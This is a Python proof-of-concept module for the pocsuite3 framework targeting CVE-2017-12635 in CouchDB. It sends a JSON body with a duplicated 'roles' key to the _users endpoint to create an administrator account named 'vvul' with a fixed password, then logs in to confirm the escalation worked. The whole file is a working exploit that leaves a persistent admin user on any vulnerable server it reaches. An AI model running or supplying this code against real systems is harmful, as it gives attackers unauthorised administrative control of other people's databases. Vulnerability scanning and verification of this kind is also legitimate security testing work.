# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
from pocsuite3.api import requests
import json


class CouchdbOutrangePOC(POCBase):
    vulID = 'CVE-2017-12635'
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 2, 2020'
    createDate = 'Aug 2, 2020'
    name = 'couchdb垂直越权'
    appName = 'couchdb'
    appVersion = 'v1.0.0'
    vulType = '越权'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 5984

        result = {}
        url = getUrl(host,port)
        if not url:
            return self.parse_output(result)
        username = 'vvul'
        password = '12345'
        if check_vul(url,username,password):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '{}:{}'.format(host,port)
            result['extra'] = username+':'+password
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

def getUrl(host,port):
    urls = [f'http://{host}:{port}',f'https://{host}:{port}']
    for url in urls:
        try:
            requests.get(url,timeout=10)
            return url
        except:
            pass
    logger.info(f'{host}:{port}\t not alive')
    return None

def check_vul(url,username,password):
    try:
        # add account
        user_url = '{}/_users/org.couchdb.user:{}'.format(url,username)
        data = {
            "type":"user",
            "name":username,
            "roles":["_admin"],
            "password":password
        }
        data = json.dumps(data)
        data = data[:-1]+', "roles": []}'
        res = requests.put(user_url,headers = {'Content-Type': 'application/json'},data=data,proxies={'http':'http://127.0.0.1:8080'})
        if res.status_code == 201:
            logger.info(f'{url}\t{username}:{password} created')
        elif res.status_code == 409:
            logger.info(f'{url}\t{username} already exists')
        else:
            return False
        # check login
        if couchDB_login(url,username,password):
            return True
    except Exception as e:
        logger.info(f'{url} fail:{str(e)}')
    return False

def couchDB_login(url,username,password):
    try:
        res = requests.post(url+'/_session',verify=False,data={
            'name':username,
            'password':password
        },timeout=10)
        if res.status_code == 200:
            return True
    except:
        pass
    return False
register_poc(CouchdbOutrangePOC)